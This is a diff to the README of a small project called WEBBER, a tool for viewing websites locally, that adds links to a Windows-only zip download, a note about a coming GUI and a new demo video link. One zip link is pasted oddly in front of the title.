@@ -1,4 +1,4 @@
-# WEBBER
+[Webber.zip](https://github.com/user-attachments/files/21329784/Webber.zip)# WEBBER
 
 > View websites locally !
 
@@ -20,8 +20,14 @@ python base.py
 
 > ONLY FOR EDUCATIONAL PURPOSES
 
+> GUI APPLICATION WHICH WILL COME SOON WILL BE CROSS-PLATFORM !
+## ZIP Folder (Windows only)
+[Webber.zip](https://github.com/user-attachments/files/21329785/Webber.zip)
+
 ## DEMO
 
 
-https://github.com/user-attachments/assets/05c610c6-7541-4886-bc98-760d75211eab
+https://github.com/user-attachments/assets/14a19d67-187c-47d9-9e00-7e4b56f54d96
+
+
 
